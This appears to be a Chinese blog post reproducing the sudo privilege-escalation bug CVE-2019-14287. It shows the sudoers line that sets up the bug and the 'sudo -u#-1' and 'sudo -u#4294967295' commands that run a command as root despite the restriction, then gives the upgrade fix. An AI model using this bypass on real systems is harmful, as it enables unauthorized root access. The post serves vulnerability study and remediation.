# 2019-10-16，sudo 提权漏洞（CVE-2019-14287）实现 - bonga - 博客园

> 原文：[`www.cnblogs.com/sym945/p/11684187.html`](https://www.cnblogs.com/sym945/p/11684187.html)

**sudo 是 linux 系统命令，让普通账号以 root 身份执行某些命令，比如，安装软件，查看某些配置文件，关机，重启等，如果普通用户需要使用 sudo 需要修改配置文件，/etc/sudoers，将 sudo 使用权限赋予该用户**

**sudo 提权漏洞，是一个安全策略绕过问题，去执行某些敏感的命令，cve 编号是 CVE-2019-14287，影响版本是 sudo 版本<1.8.28**

漏洞复现
1，查看 sudo 版本，命令 sudo -V

![](img/90c63a0f9ac0f18dbe36f833280d8c35.png)
2,修改配置文件，vim /etc/sudoers， root ALL(ALL:ALL) ALL 下添加一行配置 test ALL=(ALL,!root) ALL,需要创建 test 用户，useradd test passwd test
test ALL=(ALL,!root) ALL

![](img/eb018e27a824dc8219e485c5e92f3f63.png)
test 表示 test 用户，第一个 ALL 表示该用户可以在任意地方使用 sudo
第二个 ALL,!roo 表示该命令可以被除了 root 以外的任意用户执行
最后的 ALL 表示被允许执行
整体表示，test 用户可以使用 sudo，除了 root 以外的任意用户都可以去执行
3，切换到 test 用户，su test，然后使用 sudo id，发现没有权限去执行

![](img/6b6b984f619226f88d2e5644c14bdb96.png)

使用如下方法执行想执行的命令
sudo -u#数字 命令，其中数字范围 -1~4294967295, 命令是系统命令
如果以 root 身份去执行命令，数字使用-1 和 4294967295 来执行命令

![](img/7ac5de350bed92e8ced58064fada37cf.png)

![](img/c642e165afabea85e1f0b2da8644714a.png)

修复方法，更新 sudo 大于 1.8.27

总结，该漏洞比较鸡肋，需要管理员修改配置文件才能达成